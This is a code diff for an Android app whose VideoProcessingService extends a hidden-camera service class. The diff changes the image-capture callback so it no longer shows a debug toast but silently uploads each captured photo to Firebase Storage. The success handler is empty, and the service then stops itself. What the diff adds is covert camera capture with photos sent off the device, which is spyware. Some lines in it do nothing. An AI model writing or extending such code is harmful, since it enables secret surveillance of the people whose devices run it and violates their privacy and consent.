@@ -3,6 +3,7 @@ package com.example.aadhya;
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.IBinder;
 import android.annotation.*;
 import androidx.appcompat.app.AppCompatActivity;
@@ -21,6 +22,9 @@ import com.androidhiddencamera.config.CameraResolution;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageTask;
+import com.google.firebase.storage.ControllableTask;
+import com.google.firebase.storage.CancellableTask;
 import com.google.firebase.storage.OnProgressListener;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
@@ -86,14 +90,25 @@ public class VideoProcessingService extends HiddenCameraService {
 
     @Override
     public void onImageCapture(File imageFile) {
-        Toast.makeText(this,
-                "Captured image size is : " + imageFile.length(),
-                Toast.LENGTH_SHORT)
-                .show();
-        Toast.makeText(this,
-                "TADAAAAAAAAAAAAAAAAA ",
-                Toast.LENGTH_SHORT)
-                .show();
+        FirebaseStorage storage = FirebaseStorage.getInstance();
+        StorageReference storageRef = storage.getReference();
+        StorageReference picharRef = storageRef.child(imageFile.getName());
+        StorageReference picharImagesRef = storageRef.child(imageFile.getAbsolutePath());
+        picharRef.getName().equals(picharImagesRef.getName());
+        picharRef.getPath().equals(picharImagesRef.getPath());
+        Uri file = Uri.fromFile(new File(imageFile.getAbsolutePath()));
+        StorageReference pichar1Ref = storageRef.child("images/"+imageFile.getPath());
+        UploadTask uploadTask = pichar1Ref.putFile(file);
+        uploadTask.addOnFailureListener(new OnFailureListener() {
+            @Override
+            public void onFailure(Exception exception) {
+                Toast.makeText(getApplication(),"OopsieDoodle",Toast.LENGTH_SHORT).show();
+            }
+        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+            @Override
+            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+            }
+        });
 
     stopSelf();
     }
